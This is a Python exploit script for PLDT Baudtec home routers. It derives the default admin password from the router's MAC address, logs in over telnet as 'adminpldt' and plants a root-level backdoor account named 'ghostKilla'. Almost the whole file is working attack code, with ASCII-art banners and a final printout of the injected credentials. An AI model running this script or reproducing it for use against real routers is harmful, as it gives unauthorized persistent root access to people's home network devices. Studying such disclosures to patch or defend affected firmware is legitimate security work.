#!/usr/bin/python3
# Exploit Title: [PLDT Baudtec User injection with root privileges]
# Date: [30/06/2018]
# Exploit Author: [Abdulsalam A. Shahlol]
# Vendor Homepage: [http://www.baudtec.com.tw/, http://pldthome.com]
# tested on
# Firmware Version	RNR4_A72T_PLD_0.27R27
# Built Date	May 4 2017 15:33:19

import telnetlib
from subprocess import check_output


print("""
 ___  _    ___  ___   _ _                 _       _             _    _             _ _ _  _    _    _     ___  ___  ___  ___   ___       _       _  _
| . \| |  | . \|_ _| | | | ___ ___  _ _  | |._ _ <_> ___  ___ _| |_ <_> ___ ._ _  | | | |<_> _| |_ | |_  | . \| . || . ||_ _| | . \ _ _ <_> _ _ <_>| | ___  ___  ___  ___
|  _/| |_ | | | | |  | ' |<_-</ ._>| '_> | || ' || |/ ._>/ | ' | |  | |/ . \| ' | | | | || |  | |  | . | |   /| | || | | | |  |  _/| '_>| || | || || |/ ._>/ . |/ ._><_-<
|_|  |___||___/ |_|  `___'/__/\___.|_|   |_||_|_|| |\___.\_|_. |_|  |_|\___/|_|_| |__/_/ |_|  |_|  |_|_| |_\_\`___'`___' |_|  |_|  |_|  |_||__/ |_||_|\___.\_. |\___./__/                                                <__'                                                                                                       <___'
""")
print("By: Abdulsalam A. Shahlol Email:abdulsalamshahlol@gmail.com")
#<-----------Get the MAC-->
st=check_output("arp -a", shell=True).decode().splitlines()[3]
start=st.index("   ")
end=st.rfind("dynamic")
mac=st[start:end].strip()
lastFour=mac[12:].replace('-','').upper()
#<-----------Get the MAC-->

password=lastFour+'airocon'+'\r\n'

tn = telnetlib.Telnet('192.168.1.1')

tn.read_until(b'Username: ')
user = "adminpldt" + "\r\n"
tn.write(user.encode("ascii"))

# password='1234'+'\r\n'
tn.read_until(b"Password: ")

tn.write(password.encode("ascii"))

command='sh'+'\r\n'
tn.write(command.encode('ascii'))
command='config'+'\r\n'
tn.write(command.encode('ascii'))
command='adduser ghostKilla password root'+'\r\n'
tn.write(command.encode('ascii'))
command='exit'+'\r\n'
tn.write(command.encode('ascii'))
command='exit'+'\r\n'
tn.write(command.encode('ascii'))
# l=tn.read_all()
# print(l.decode('ascii'))

print('''
  ;
  ED.              :
  E#Wi            t#,     L.                     ,;
  E###G.         ;##W.    EW:        ,ft       f#i
  E#fD#W;       :#L:WE    E##;       t#E     .E#t
  E#t t##L     .KG  ,#D   E###t      t#E    i#W,
  E#t  .E#K,   EE    ;#f  E#fE#f     t#E   L#D.
  E#t    j##f f#.     t#i E#t D#G    t#E :K#Wfff;
  E#t    :E#K::#G     GK  E#t  f#E.  t#E i##WLLLLt
  E#t   t##L   ;#L   LW.  E#t   t#K: t#E  .E#L
  E#t .D#W;     t#f f#:   E#t    ;#W,t#E    f#E:
  E#tiW#G.       f#D#;    E#t     :K#D#E     ,WW;
  E#K##i          G#t     E#t      .E##E      .D#;
  E##D.            t      ..         G#E        tt
  E#t                                 fE
  L:                                   ,
''')

print("Injected user credentials with root privileges")
print("Username: ghostKilla")
print("Password: password")
tn.close()
